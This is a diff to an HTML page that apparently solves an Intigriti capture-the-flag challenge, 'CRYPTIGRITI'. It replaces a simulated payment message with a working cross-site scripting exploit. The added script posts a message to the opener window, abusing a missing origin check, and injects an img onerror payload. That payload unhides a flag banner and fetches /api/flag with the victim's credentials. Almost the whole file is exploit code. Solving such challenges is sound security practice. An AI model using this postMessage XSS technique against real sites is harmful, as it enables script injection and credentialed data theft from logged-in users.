@@ -1,23 +1,23 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>CRYPTIGRITI Flag Exploit</title>
+</head>
 <body>
+<h1>Send XSS to get flag</h1>
 <script>
-// This simulates what happens when the payment gateway sends a message
-window.addEventListener('message', (event) => {
-    console.log('Received:', event.data);
-    // Echo back with different data
-    event.source.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-            toAddress: '10970063d33e32396bb80753a2b902d568', // Try different addresses
-            currency: '1337COIN',
-            amount: 1337 // Common CTF number
-        }
-    }, '*');
-});
-
-// Open the checkout page
-window.open('https://challenge-0126.intigriti.io/checkout.html');
+// Wait a moment then send the exploit
+setTimeout(() => {
+    // Target must be buy.html page
+    window.opener.postMessage({
+        type: 'updateContent',      // Must match exactly
+        widgetId: 'salesWidget',    // Target div ID from buy.html
+        content: '<img src=x onerror="document.getElementById(\'flagBanner\').classList.remove(\'hidden\'); fetch(\'/api/flag\',{credentials:\'include\'}).then(r=>r.json()).then(d=>{if(d.flag){document.getElementById(\'flagText\').textContent=\'FLAG: \'+d.flag;}})">'
+    }, '*'); // No origin check - the vulnerability
+    
+    alert('XSS payload sent! Check buy.html for flag banner.');
+}, 1000);
 </script>
+<p>Make sure you are logged into CRYPTIGRITI and have buy.html open.</p>
 </body>
 </html>
